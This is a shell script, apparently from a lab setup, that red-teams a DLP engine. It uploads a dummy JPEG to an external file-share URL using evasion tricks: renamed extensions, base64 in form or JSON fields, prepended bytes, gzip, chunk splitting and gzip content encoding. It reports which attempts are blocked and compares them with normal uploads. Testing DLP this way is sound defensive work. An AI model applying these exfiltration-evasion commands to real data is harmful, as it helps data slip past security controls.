#!/bin/sh
# Red-team attacks against the DLP engine.
# Run from Windows:  docker compose exec alice sh /tests/attacks.sh

URL=${URL:-https://fileshare.ext/upload}
cd /tmp
rm -f piece_* small_*

# Fresh test files
printf '\377\330\377\340' > photo.jpg
head -c 20000 /dev/urandom >> photo.jpg
printf 'hello from alice' > note.txt

# try <label> <curl options...>: send one request, print BLOCKED or ALLOWED
try() {
    label=$1
    shift
    code=$(curl -s -o /tmp/answer.txt -w '%{http_code}' "$@")
    if [ "$code" = "403" ]; then
        printf '%-28s BLOCKED  %s\n' "$label" "$(head -c 70 /tmp/answer.txt | tr -d '\n')"
    else
        printf '%-28s ALLOWED  (HTTP %s)\n' "$label" "$code"
    fi
}

echo "== Attacks (all should be BLOCKED)"
cp photo.jpg quarterly-report.txt
try "1 renamed .txt"           -F file=@quarterly-report.txt "$URL"

base64 photo.jpg | tr -d '\n' > photo.b64
try "2 base64 in form field"   -F "data=<photo.b64" "$URL"

printf '{"img":"%s"}' "$(cat photo.b64)" > photo.json
try "3 base64 in JSON"         -H "Content-Type: application/json" --data @photo.json "$URL"

(printf 'hello'; cat photo.jpg) > sneaky.bin
try "4 5 bytes in front"       -F file=@sneaky.bin "$URL"

gzip -c photo.jpg > photo.gz
try "5 gzip file"              -F file=@photo.gz "$URL"

split -b 5000 photo.jpg piece_
for p in piece_*; do
    try "6 piece $p ($(wc -c < $p)B)" -F file=@$p "$URL"
done

gzip -c photo.jpg > body.gz
try "7 HTTP gzip encoding"     -H "Content-Encoding: gzip" --data-binary @body.gz "$URL"

echo
echo "== Extra: 900-byte pieces"
split -b 900 photo.jpg small_
blocked=0
allowed=0
for p in small_*; do
    code=$(curl -s -o /dev/null -w '%{http_code}' -F file=@$p "$URL")
    if [ "$code" = "403" ]; then blocked=$((blocked + 1)); else allowed=$((allowed + 1)); fi
done
echo "900-byte pieces: $blocked blocked, $allowed allowed"

echo
echo "== Normal traffic (should be ALLOWED)"
try "text file upload"         -F doc=@note.txt "$URL"
try "JSON search"              -H "Content-Type: application/json" --data '{"search":"weather istanbul","page":1}' "$URL"